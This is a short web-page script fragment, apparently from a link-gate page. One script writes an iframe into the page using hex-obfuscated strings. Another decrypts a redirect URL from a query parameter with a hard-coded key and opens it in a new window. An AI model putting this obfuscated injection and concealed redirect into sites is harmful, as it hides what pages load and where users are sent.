<script type='text/javascript'>
        var _0x28f9 = [&quot;\x3C\x68\x32\x20\x61\x6C\x69\x67\x6E\x3D\x22\x63\x65\x6E\x74\x65\x72\x22\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x22&quot;, &quot;\x2F\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x68\x31\x3E&quot;, &quot;\x77\x72\x69\x74\x65&quot;]; document[_0x28f9[2]](_0x28f9[0] + src1 + _0x28f9[1])
    </script>
<script type='text/javascript'>
       //<![CDATA[
        document.getElementById("yt").style.display = "none";
        document.getElementById("ytv").style.display = "none";
        function show() {
			var urlA = aesCrypto.decrypt(convertstr($.urlParam('o')),convertstr('root'));
	        window.open(urlA, '_blank');			
            // sleep(3000);
            setTimeout(function () {
                document.getElementById("yt").style.display = "block";
                document.getElementById("btn_yt").style.display = "none";
                document.getElementById("ytv").style.display = "none";
            }, 10000);
            //alert();
            document.getElementById("btn_yt").style.display = "none";
            document.getElementById("ytv").style.display = "block";
        }
        
          //]]>
    </script>